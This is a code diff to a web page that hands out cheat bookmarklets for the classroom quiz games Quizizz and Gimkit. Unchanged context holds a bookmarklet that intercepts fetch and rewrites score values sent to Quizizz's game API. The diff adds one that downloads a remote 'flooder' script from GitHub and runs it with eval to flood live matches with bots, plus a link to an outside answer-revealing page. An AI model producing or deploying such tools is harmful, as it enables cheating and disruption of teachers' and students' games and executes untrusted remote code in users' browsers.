@@ -315,7 +315,7 @@ function downloadFile() {
             <title>Quizizz Hacks</title>
             </head>
             <body style="padding: 0; margin: 0; overflow: hidden;">
-              <h1>The Quizizz works and has been tested</h1>
+              <h1>The Quizizz Hacks works and has been tested</h1>
                <br>
                 <br>
                <h3>Please drag the link to your bookmarks tab</h3>
@@ -324,7 +324,7 @@ function downloadFile() {
                <a href='javascript:(()=>{const e=parseInt(prompt("Points per question (max is 7000):"))-5e3,o=fetch;window.fetch=function(r,s){if(["https://game.quizizz.com/play-api/v4/soloProceed","https://game.quizizz.com/play-api/v4/proceedGame"].includes(r)){const o=JSON.parse(s.body);o.response.provisional.scores={correct:e+5e3,incorrect:e+5e3},o.response.provisional.scoreBreakups={correct:{base:5e3,timer:5e3,streak:5e3,powerups:[],total:e+5e3},incorrect:{base:5e3,timer:5e3,streak:5e3,powerups:[],total:e+5e3}},s.body=JSON.stringify(o)}return o(r,s)}})();'>Please Drag me to your bookmarks tab - Choose your points in a quizizz live match</a>
                 <br>
                  <br>
-                <a href="">Please Drag me to your bookmarks tab - Flood the quizizz live match with bots</a>
+                <a href='javascript:(function()%7Bfetch("https%3A%2F%2Fraw.githubusercontent.com%2Fseanv999%2Fquizizz-flooder%2Fmain%2Fflood.js")%0A.then((res) %3D> res.text()%0A.then((t) %3D> eval(t)))%7D)()%3B'>Please Drag me to your bookmarks tab - Flood the quizizz live match with bots</a>
             </body>
       `;
 
@@ -335,7 +335,24 @@ function downloadFile() {
     else if (utility == "Gimkit Hacks") {
         if (version == 0) {
           console.log("Version 0")
-         open("")
+         var tempPage = `
+            <html>
+            <head>
+            <title>Gimkit Hacks</title>
+            </head>
+            <body style="padding: 0; margin: 0; overflow: hidden;">
+              <h1>The Gimkit hacks works and has been tested</h1>
+               <br>
+                <br>
+               <h3>Please drag the link to your bookmarks tab</h3>
+               <br>
+                <br>
+               <a href='https://2emk7.github.io/gkt.html'>Please Drag me to your bookmarks tab - click on it will bring you to a new page. After you cycle through questions it will only show the correct one.</a>
+            </body>
+      `;
+
+      var w = window.open(''); 
+    w.document.write(tempPage);
         }
     }
     else if (utility == "Edpuzzle Hacks") {
